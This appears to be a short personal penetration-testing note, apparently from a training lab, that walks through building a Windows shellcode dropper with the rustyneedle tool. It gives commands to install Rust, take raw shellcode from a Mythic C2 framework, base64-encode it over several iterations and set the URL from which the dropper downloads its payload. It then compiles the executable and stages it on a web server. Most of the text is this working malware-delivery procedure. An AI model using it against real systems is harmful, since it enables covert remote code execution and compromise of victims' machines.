rustyneedle is a python script used to modify raw shellcode, and provide an executable.

https://codeberg.org/mttaggart/rustyneedle

```
# Clone the repo
git clone https://codeberg.org/mttaggart/rustyneedle.git

# Install rust
sudo apt install rustup -y
rustup default stable

# Set the compilation target, and add it in this case 64 bit Windows
rustup target add x86_64-pc-windows-gnu
```
There's a few things we have to do. We have to install rust, modify the  src/main.rs file to our options

Specifically, modify the number of base64 iterations, and where the shellcode is downloaded from.

Take note of lines 10 and 12
![[Pasted image 20250529002207.png]]

Now, we need to make our encoded shellcode.
```bash
# Create raw shellcode, like with C2 Mythic. It will be an output option, .bin extension
cd rustyneedle
cp ~/c2/shellcode.bin .

# Encode the shellcode. note that the output file name is note.txt
python3 rustyneedle/encode.py shellcode.bin 3 note.txt

# Take note of where in the dropper we put the downloaded url, and put the note.txt shellcode file there

# Compile the main.rs dropper
cargo build --target x86_64-pc-windows-gnu --release

# Navigate the binary and put it where we want
cp target/x86_64-pc-windows-gnu/release/rustyneedle.exe ~/prolab/cybernetic/web



```

